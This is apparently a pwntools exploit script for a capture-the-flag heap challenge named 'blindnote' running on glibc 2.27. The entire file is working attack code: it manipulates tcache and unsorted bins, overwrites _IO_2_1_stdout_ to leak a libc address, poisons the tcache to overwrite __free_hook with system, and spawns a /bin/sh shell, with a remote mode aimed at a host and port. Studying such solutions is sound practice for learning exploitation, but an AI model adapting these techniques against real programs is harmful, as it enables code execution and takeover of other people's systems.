#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./blindnote"
libc = ELF("./libc-2.27.so")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def create(buf):
    p.sendlineafter(">", "1")
    p.sendlineafter("Contents:", buf)

def delete(index: int):
    p.sendlineafter(">", "3")
    p.sendlineafter("Index:", str(index))

for _ in range(8):
    create(b'A' * 8)

# fill tcache
delete(7)
delete(6)
delete(5)
delete(4)
delete(1)
delete(0)
delete(2)
# send chunk to Unsorted bin
delete(3)# Unsorted
# spawn _IO_2_1_stdout in Unsorted bin
create(b'B' * 0x90 + p64(0) + p64(0xa0) + b'\x60\xc7')
# overwrite tcache bk to Unsorted bin chunk
create(b'C' * 0x90 + p64(0) + p64(0xa0) + b'\x40')
# allocate & overwrite _IO_2_1_stdout
## https://ptr-yudai.hatenablog.com/entry/2019/05/31/235444
create(b'D' * 8)
create(b'E' * 8)
payload = p64(0xfbad1800)# flag
payload += p64(0) * 3# _IO_read_ptr, _IO_read_end, _IO_read_base
payload += b'\xc8'# last byte of _IO_write_base
create(payload)
# leak _IO_2_1_stdin_
p.recvuntil(b'\x20')
leak = u64(p.recv(8))
log.info("leak: " + hex(leak))
libc_base = leak - 0x3eba00
log.info("libc base: " + hex(libc_base))
# tcache poisoning
free_hook_addr = libc_base + libc.symbols['__free_hook']
log.info("__free_hook: " + hex(free_hook_addr))
system_addr = libc_base + libc.symbols['system']
log.info("system@libc: " + hex(system_addr))
delete(2)
delete(1)
create(b'F' * 0x90 + p64(0) + p64(0xa0) + p64(free_hook_addr))
create(b'/bin/sh')
create(p64(system_addr))
delete(2)

p.interactive()
